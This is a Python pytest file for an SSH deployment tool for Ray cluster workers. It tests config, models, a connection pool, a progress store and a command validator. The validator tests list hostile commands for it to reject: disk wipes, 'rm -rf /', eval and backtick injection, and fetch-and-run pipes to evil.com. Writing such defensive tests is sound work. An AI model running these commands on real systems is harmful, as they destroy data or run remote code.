"""Integration tests for SSH deployment functionality.

Tests the real classes from scripts.ssh_deploy module:
- SSHDeployConfig, ConnectionState, DeployStatus (enums and config)
- DeployWorkerRequest, DeployProgress (Pydantic models)
- DeployStep, IdempotencyChecker, RollbackManager (business logic)
- SSHConnectionPool (connection pool management)
- DeployProgressStore (progress persistence)
- validate_command() (security validation)

Use @pytest.mark.skip_ci for tests that require real SSH connections.
"""

import asyncio
import ipaddress
import re
import sys
from pathlib import Path
from unittest.mock import AsyncMock, MagicMock, patch

import pytest

# Add project root to path for imports
sys.path.insert(0, str(Path(__file__).parent.parent.parent))

# Fix asyncssh version incompatibility (asyncssh.Connection doesn't exist in 2.22.0,
# should be SSHClientConnection) - must patch before importing scripts.ssh_deploy
import asyncssh
asyncssh.Connection = asyncssh.SSHClientConnection

from scripts.ssh_deploy import (
    SSHDeployConfig,
    ConnectionState,
    DeployStatus,
    DeployWorkerRequest,
    DeployProgress,
    DeployStep,
    SSHConnectionPool,
    DeployProgressStore,
    validate_command,
    _get_ssh_client_keys,
    _get_known_hosts,
    ALLOWED_COMMANDS,
    FORBIDDEN_PATTERNS,
)


class TestSSHDeployConfig:
    """Test suite for SSHDeployConfig settings."""

    def test_config_defaults(self):
        """Test SSHDeployConfig has expected default values."""
        config = SSHDeployConfig()
        assert config.CONNECT_TIMEOUT == 30
        assert config.COMMAND_TIMEOUT == 300
        assert config.MAX_RETRIES == 3
        assert config.RETRY_BASE_DELAY == 1.0
        assert config.RETRY_MAX_DELAY == 60.0
        assert config.MAX_CONNECTIONS_PER_HOST == 2
        assert config.GLOBAL_MAX_CONNECTIONS == 10
        assert config.MAX_CONCURRENT_DEPLOYS == 5
        assert config.TERM == "xterm-color"

    def test_config_ssh_key_dir(self):
        """Test SSH key directory is set correctly."""
        assert SSHDeployConfig.SSH_KEY_DIR == Path.home() / ".ssh"
        assert SSHDeployConfig.DEFAULT_KEY_TYPES == ["ed25519", "rsa", "ecdsa"]


class TestEnums:
    """Test suite for ConnectionState and DeployStatus enums."""

    def test_connection_state_values(self):
        """Test ConnectionState enum has all expected states."""
        assert ConnectionState.DISCONNECTED.value == "disconnected"
        assert ConnectionState.CONNECTING.value == "connecting"
        assert ConnectionState.IDLE.value == "idle"
        assert ConnectionState.COMMAND_RUNNING.value == "command_running"
        assert ConnectionState.RETRYING.value == "retrying"
        assert ConnectionState.ERROR.value == "error"

    def test_deploy_status_values(self):
        """Test DeployStatus enum has all expected states."""
        assert DeployStatus.PENDING.value == "pending"
        assert DeployStatus.CONNECTING.value == "connecting"
        assert DeployStatus.DEPLOYING.value == "deploying"
        assert DeployStatus.VERIFYING.value == "verifying"
        assert DeployStatus.COMPLETED.value == "completed"
        assert DeployStatus.FAILED.value == "failed"
        assert DeployStatus.CANCELLED.value == "cancelled"


class TestDeployWorkerRequest:
    """Test suite for DeployWorkerRequest Pydantic model."""

    def test_valid_request(self):
        """Test creating a valid DeployWorkerRequest."""
        request = DeployWorkerRequest(
            node_ip="192.168.0.115",
            username="admin02",
            password="test_password",
            head_ip="192.168.0.126",
            ray_port=6379,
        )
        assert request.node_ip == "192.168.0.115"
        assert request.username == "admin02"
        assert request.password == "test_password"
        assert request.head_ip == "192.168.0.126"
        assert request.ray_port == 6379

    def test_default_values(self):
        """Test DeployWorkerRequest default values."""
        request = DeployWorkerRequest(
            node_ip="192.168.0.115",
            username="admin",
            password="pass",
            head_ip="192.168.0.126",
        )
        assert request.username == "admin"
        assert request.ray_port == 6379
        assert request.proxy_url is None

    def test_ip_address_not_formally_validated(self):
        """Test that Pydantic accepts string IP (validation is at runtime, not schema)."""
        # Note: Pydantic doesn't automatically validate IP format unless using pydantic_ipv4
        # The actual IP validation happens at SSH connection time
        request = DeployWorkerRequest(
            node_ip="not-an-ip",  # Accepts any string
            username="admin",
            password="pass",
            head_ip="192.168.0.126",
        )
        assert request.node_ip == "not-an-ip"


class TestDeployProgress:
    """Test suite for DeployProgress Pydantic model."""

    def test_deploy_progress_creation(self):
        """Test creating a DeployProgress instance."""
        from datetime import datetime
        progress = DeployProgress(
            task_id="test-123",
            status=DeployStatus.PENDING,
            step="initializing",
            step_index=0,
            total_steps=7,
            progress=0,
            message="Starting deployment",
            node_ip="192.168.0.115",
            started_at=datetime.now(),
        )
        assert progress.task_id == "test-123"
        assert progress.status == DeployStatus.PENDING
        assert progress.progress == 0
        assert progress.error is None

    def test_deploy_progress_completed(self):
        """Test DeployProgress with completed status."""
        from datetime import datetime
        progress = DeployProgress(
            task_id="test-456",
            status=DeployStatus.COMPLETED,
            step="verify",
            step_index=7,
            total_steps=7,
            progress=100,
            message="Deployment complete",
            node_ip="192.168.0.115",
            started_at=datetime.now(),
            completed_at=datetime.now(),
        )
        assert progress.status == DeployStatus.COMPLETED
        assert progress.progress == 100
        assert progress.completed_at is not None


class TestDeployStep:
    """Test suite for DeployStep class."""

    def test_deploy_step_creation(self):
        """Test creating a DeployStep."""
        step = DeployStep(
            key="test_step",
            name="Test Step",
            weight=10,
            description="A test step",
        )
        assert step.key == "test_step"
        assert step.name == "Test Step"
        assert step.weight == 10
        assert step.description == "A test step"
        assert step.check_fn is None
        assert step.execute_fn is None
        assert step.rollback_fn is None

    def test_deploy_step_with_callbacks(self):
        """Test DeployStep with callback functions."""
        def check_fn():
            return True

        def execute_fn():
            pass

        def rollback_fn():
            pass

        step = DeployStep(
            key="full_step",
            name="Full Step",
            weight=20,
            description="A step with all callbacks",
            check_fn=check_fn,
            execute_fn=execute_fn,
            rollback_fn=rollback_fn,
        )
        assert step.check_fn is check_fn
        assert step.execute_fn is execute_fn
        assert step.rollback_fn is rollback_fn


class TestCommandValidation:
    """Test suite for validate_command() security function."""

    def test_validate_command_allows_ray_start(self):
        """Test that ray start commands are allowed."""
        allowed_commands = [
            "ray start --address=192.168.0.126:6379",
            "ray stop",
            "ray status",
            "ray start --head --port=6379",
        ]
        for cmd in allowed_commands:
            assert validate_command(cmd) is True, f"Should allow: {cmd}"

    def test_validate_command_allows_bash_scripts(self):
        """Test that bash scripts invoking join_cluster.sh are allowed."""
        allowed_commands = [
            "bash scripts/join_cluster.sh",
            "/bin/bash scripts/join_cluster.sh",
            "bash /full/path/to/join_cluster.sh",
        ]
        for cmd in allowed_commands:
            assert validate_command(cmd) is True, f"Should allow: {cmd}"

    def test_validate_command_allows_uv_commands(self):
        """Test that uv commands are allowed."""
        allowed_commands = [
            "~/.local/bin/uv venv ~/.venv-ray",
            "~/.local/bin/uv python install 3.10.12",
        ]
        for cmd in allowed_commands:
            assert validate_command(cmd) is True, f"Should allow: {cmd}"

    def test_validate_command_allows_rsync(self):
        """Test that rsync commands are allowed."""
        allowed_commands = [
            "rsync -avz --delete src/ user@host:~/dest/",
            "rsync -av --delete src/ user@host:~/dest/",
        ]
        for cmd in allowed_commands:
            assert validate_command(cmd) is True, f"Should allow: {cmd}"

    def test_validate_command_allows_file_commands(self):
        """Test that safe file commands are allowed."""
        allowed_commands = [
            "test -d ~/Code/AlgoStudio",
            "test -f ~/.ssh/id_ed25519",
            "ls -la",
            "ls -l",
            "ls -a",
            "cat /etc/hosts",
            "grep 'ray' ~/.bashrc",
        ]
        for cmd in allowed_commands:
            assert validate_command(cmd) is True, f"Should allow: {cmd}"

    def test_validate_command_allows_pip_install(self):
        """Test that pip install commands are allowed."""
        allowed_commands = [
            "~/.venv-ray/bin/pip install ray psutil",
            "~/.venv-ray/bin/pip install -e .",
        ]
        for cmd in allowed_commands:
            assert validate_command(cmd) is True, f"Should allow: {cmd}"

    def test_validate_command_allows_sudo_tee(self):
        """Test that sudo tee for sudoers is allowed."""
        # The actual command allowed by regex is just "sudo tee /path"
        cmd = "sudo tee /etc/sudoers.d/admin02"
        assert validate_command(cmd) is True

    def test_validate_command_allows_curl(self):
        """Test that curl install script is allowed."""
        cmd = "curl -LsSf https://astral.sh/uv/install.sh"
        assert validate_command(cmd) is True

    def test_validate_command_allows_python_check(self):
        """Test that python check commands are allowed."""
        cmd = "~/.venv-ray/bin/python -c 'import ray; print(ray.__version__)'"
        assert validate_command(cmd) is True

    def test_validate_command_allows_pgrep(self):
        """Test that pgrep commands are allowed."""
        cmd = "pgrep -x ray"
        assert validate_command(cmd) is True

    def test_validate_command_rejects_rm_rf(self):
        """Test that rm -rf is rejected."""
        forbidden_commands = [
            "rm -rf /",
            "rm -rf /home",
            "; rm -rf /",
            "rm  -rf  /",
        ]
        for cmd in forbidden_commands:
            assert validate_command(cmd) is False, f"Should reject: {cmd}"

    def test_validate_command_rejects_disk_wipe(self):
        """Test that disk wipe commands are rejected."""
        forbidden_commands = [
            "> /dev/sda",
            "dd if=/dev/zero of=/dev/sda",
            "dd if=/dev/urandom of=/dev/sdb",
        ]
        for cmd in forbidden_commands:
            assert validate_command(cmd) is False, f"Should reject: {cmd}"

    def test_validate_command_rejects_shutdown(self):
        """Test that shutdown/reboot commands are rejected."""
        forbidden_commands = [
            "; shutdown -h now",
            "; reboot",
            "; shutdown -r now",
        ]
        for cmd in forbidden_commands:
            assert validate_command(cmd) is False, f"Should reject: {cmd}"

    def test_validate_command_rejects_eval_injection(self):
        """Test that eval with variable expansion is rejected."""
        forbidden_commands = [
            "eval $SOME_VAR",
            "eval $(cat malicious)",
        ]
        for cmd in forbidden_commands:
            assert validate_command(cmd) is False, f"Should reject: {cmd}"

    def test_validate_command_rejects_backtick_injection(self):
        """Test that backtick command substitution is rejected."""
        forbidden_commands = [
            "`ls -la`",
            "echo `whoami`",
        ]
        for cmd in forbidden_commands:
            assert validate_command(cmd) is False, f"Should reject: {cmd}"

    def test_validate_command_rejects_unknown_commands(self):
        """Test that unknown commands are rejected."""
        rejected_commands = [
            "vim",
            "nano",
            "wget http://evil.com/script.sh | bash",
            "curl http://evil.com | bash",
            "python -c 'import os; os.system(\"rm -rf /\")'",
        ]
        for cmd in rejected_commands:
            assert validate_command(cmd) is False, f"Should reject: {cmd}"

    def test_validate_command_strips_whitespace(self):
        """Test that validate_command strips whitespace before matching."""
        assert validate_command("  ray start --address=192.168.0.126:6379") is True
        assert validate_command("ray start --address=192.168.0.126:6379  ") is True


class TestSSHConnectionPool:
    """Test suite for SSHConnectionPool class."""

    @pytest.mark.asyncio
    async def test_pool_initialization(self):
        """Test SSHConnectionPool initializes with correct defaults."""
        pool = SSHConnectionPool()
        assert pool.max_per_host == SSHDeployConfig.MAX_CONNECTIONS_PER_HOST
        assert pool.global_max == SSHDeployConfig.GLOBAL_MAX_CONNECTIONS
        assert pool.timeout == SSHDeployConfig.CONNECT_TIMEOUT
        assert pool._active_count == 0
        assert len(pool._available) == 0

    @pytest.mark.asyncio
    async def test_pool_custom_initialization(self):
        """Test SSHConnectionPool with custom parameters."""
        pool = SSHConnectionPool(
            max_connections_per_host=5,
            global_max_connections=20,
            connection_timeout=60,
        )
        assert pool.max_per_host == 5
        assert pool.global_max == 20
        assert pool.timeout == 60

    @pytest.mark.asyncio
    async def test_release_connection_closed_decrements_active(self):
        """Test that releasing a closed connection decrements active count atomically."""
        pool = SSHConnectionPool()
        pool._active_count = 1

        # Create a mock closed connection
        mock_conn = MagicMock()
        mock_conn.is_closed.return_value = True

        await pool.release_connection("192.168.0.115", mock_conn)

        assert pool._active_count == 0

    @pytest.mark.asyncio
    async def test_release_connection_valid_returns_to_pool(self):
        """Test that releasing a valid connection returns it to the pool."""
        pool = SSHConnectionPool()
        pool._active_count = 1

        # Create a mock valid (open) connection
        mock_conn = MagicMock()
        mock_conn.is_closed.return_value = False

        await pool.release_connection("192.168.0.115", mock_conn)

        # Connection should be in available pool
        assert len(pool._available["192.168.0.115"]) == 1
        assert pool._active_count == 1

    @pytest.mark.asyncio
    async def test_release_connection_pool_full_closes(self):
        """Test that releasing to a full pool closes the connection."""
        pool = SSHConnectionPool(max_connections_per_host=1)
        pool._active_count = 1

        # Create a mock valid connection
        mock_conn = MagicMock()
        mock_conn.is_closed.return_value = False

        # First release - goes to pool
        await pool.release_connection("192.168.0.115", mock_conn)
        assert len(pool._available["192.168.0.115"]) == 1

        # Second release - pool is full, should close
        await pool.release_connection("192.168.0.115", mock_conn)
        mock_conn.close.assert_called()

    @pytest.mark.asyncio
    async def test_pool_concurrent_releases(self):
        """Test concurrent release operations maintain atomicity."""
        pool = SSHConnectionPool()
        pool._active_count = 5

        # Create multiple mock connections
        closed_conns = [MagicMock(is_closed=lambda: True) for _ in range(3)]
        valid_conn = MagicMock(is_closed=lambda: False)

        # Release all connections concurrently
        await asyncio.gather(*[
            pool.release_connection("192.168.0.115", conn)
            for conn in closed_conns + [valid_conn]
        ])

        # 3 closed connections decrement active_count by 3: 5 -> 2
        # 1 valid connection returned to pool (not decremented)
        assert pool._active_count == 2
        assert len(pool._available["192.168.0.115"]) == 1

    @pytest.mark.asyncio
    async def test_context_manager(self):
        """Test pool connection context manager."""
        pool = SSHConnectionPool()

        # Mock get_connection to return a mock
        mock_conn = MagicMock()
        mock_conn.is_closed.return_value = False

        with patch.object(pool, 'get_connection', return_value=mock_conn) as mock_get:
            with patch.object(pool, 'release_connection', new_callable=AsyncMock) as mock_release:
                async with pool.connection("192.168.0.115", "admin") as conn:
                    assert conn is mock_conn

                mock_release.assert_called_once_with("192.168.0.115", mock_conn)


class TestDeployProgressStore:
    """Test suite for DeployProgressStore class."""

    @pytest.mark.asyncio
    async def test_store_initialization(self):
        """Test DeployProgressStore initializes correctly."""
        store = DeployProgressStore()
        assert store._redis is None
        assert len(store._progress) == 0
        assert store._redis_host == "localhost"
        assert store._redis_port == 6380

    @pytest.mark.asyncio
    async def test_store_custom_redis_config(self):
        """Test DeployProgressStore with custom Redis config."""
        store = DeployProgressStore(redis_host="192.168.0.126", redis_port=6379)
        assert store._redis_host == "192.168.0.126"
        assert store._redis_port == 6379

    @pytest.mark.asyncio
    async def test_create_progress(self):
        """Test creating a new progress record."""
        store = DeployProgressStore()
        task_id = "test-deploy-001"
        node_ip = "192.168.0.115"

        progress = await store.create(task_id, node_ip, total_steps=7)

        assert progress.task_id == task_id
        assert progress.node_ip == node_ip
        assert progress.status == DeployStatus.PENDING
        assert progress.total_steps == 7
        assert progress.progress == 0
        assert task_id in store._progress

    @pytest.mark.asyncio
    async def test_update_progress(self):
        """Test updating a progress record."""
        store = DeployProgressStore()
        task_id = "test-deploy-002"
        await store.create(task_id, "192.168.0.115")

        await store.update(
            task_id,
            status=DeployStatus.DEPLOYING,
            step="install_deps",
            step_index=4,
            progress=50,
            message="Installing dependencies",
        )

        updated = await store.get(task_id)
        assert updated.status == DeployStatus.DEPLOYING
        assert updated.step == "install_deps"
        assert updated.step_index == 4
        assert updated.progress == 50
        assert updated.message == "Installing dependencies"

    @pytest.mark.asyncio
    async def test_complete_progress(self):
        """Test marking a task as completed."""
        store = DeployProgressStore()
        task_id = "test-deploy-003"
        await store.create(task_id, "192.168.0.115")

        await store.complete(task_id)

        completed = await store.get(task_id)
        assert completed.status == DeployStatus.COMPLETED
        assert completed.progress == 100
        assert completed.completed_at is not None

    @pytest.mark.asyncio
    async def test_fail_progress(self):
        """Test marking a task as failed."""
        store = DeployProgressStore()
        task_id = "test-deploy-004"
        await store.create(task_id, "192.168.0.115")

        await store.fail(task_id, "Connection refused")

        failed = await store.get(task_id)
        assert failed.status == DeployStatus.FAILED
        assert failed.error == "Connection refused"
        assert failed.completed_at is not None

    @pytest.mark.asyncio
    async def test_get_nonexistent(self):
        """Test getting a nonexistent task returns None."""
        store = DeployProgressStore()
        result = await store.get("nonexistent-task")
        assert result is None

    @pytest.mark.asyncio
    async def test_update_nonexistent_no_error(self):
        """Test updating a nonexistent task doesn't raise error."""
        store = DeployProgressStore()
        # Should not raise
        await store.update("nonexistent-task", progress=50)
        assert "nonexistent-task" not in store._progress


class TestSSHKeyLoading:
    """Test suite for SSH key loading functions."""

    def test_get_ssh_client_keys_returns_list(self):
        """Test that _get_ssh_client_keys returns a list."""
        keys = _get_ssh_client_keys()
        assert isinstance(keys, list)

    def test_get_known_hosts_returns_list(self):
        """Test that _get_known_hosts returns a list."""
        known_hosts = _get_known_hosts()
        assert isinstance(known_hosts, list)
        # Should be empty or contain paths
        for path in known_hosts:
            assert isinstance(path, str)


class TestIntegrationScenarios:
    """Integration tests combining multiple components."""

    @pytest.mark.asyncio
    async def test_deploy_progress_lifecycle(self):
        """Test complete deploy progress lifecycle."""
        store = DeployProgressStore()
        task_id = "test-lifecycle-001"
        node_ip = "192.168.0.115"

        # Create
        progress = await store.create(task_id, node_ip, total_steps=7)
        assert progress.status == DeployStatus.PENDING

        # Connecting
        await store.update(task_id, status=DeployStatus.CONNECTING, step="connecting",
                          step_index=1, progress=5, message="Connecting...")
        assert (await store.get(task_id)).status == DeployStatus.CONNECTING

        # Deploying
        await store.update(task_id, status=DeployStatus.DEPLOYING, step="install_deps",
                          step_index=4, progress=60, message="Installing...")
        assert (await store.get(task_id)).status == DeployStatus.DEPLOYING

        # Verifying
        await store.update(task_id, status=DeployStatus.VERIFYING, step="verify",
                          step_index=7, progress=95, message="Verifying...")
        assert (await store.get(task_id)).status == DeployStatus.VERIFYING

        # Complete
        await store.complete(task_id)
        completed = await store.get(task_id)
        assert completed.status == DeployStatus.COMPLETED
        assert completed.progress == 100
        assert completed.completed_at is not None

    @pytest.mark.asyncio
    async def test_deploy_progress_failure_recovery(self):
        """Test deploy failure and retry scenario."""
        store = DeployProgressStore()
        task_id = "test-failure-001"
        node_ip = "192.168.0.115"

        # Create and fail
        await store.create(task_id, node_ip)
        await store.fail(task_id, "Connection timeout")

        failed = await store.get(task_id)
        assert failed.status == DeployStatus.FAILED
        assert failed.error == "Connection timeout"

        # Simulate retry - update existing progress
        # Note: error field is preserved (not automatically cleared on retry)
        await store.update(task_id, status=DeployStatus.PENDING, step="connecting",
                          step_index=0, progress=0, message="Retrying...")

        retried = await store.get(task_id)
        assert retried.status == DeployStatus.PENDING
        # Error is preserved - clear it explicitly if needed
        assert retried.error == "Connection timeout"


# ==============================================================================
# Tests requiring real SSH connections - skip in CI
# ==============================================================================

@pytest.mark.skip_ci(reason="Requires real SSH connection to 192.168.0.115")
class TestSSHConnectionReal:
    """Test suite requiring real SSH connections."""

    @pytest.mark.asyncio
    async def test_real_ssh_connection(self):
        """Test connecting to real SSH server."""
        # This test requires:
        # 1. SSH key authentication set up
        # 2. The target machine reachable at 192.168.0.115
        pytest.skip("Skipped in CI - requires real SSH")

    @pytest.mark.asyncio
    async def test_real_command_execution(self):
        """Test executing real commands over SSH."""
        pytest.skip("Skipped in CI - requires real SSH")


@pytest.mark.skip_ci(reason="Requires JuiceFS/Redis at 192.168.0.126:6380")
class TestRedisProgressStoreReal:
    """Test suite requiring real Redis connection."""

    @pytest.mark.asyncio
    async def test_redis_persistence(self):
        """Test progress persists to real Redis."""
        pytest.skip("Skipped in CI - requires real Redis")
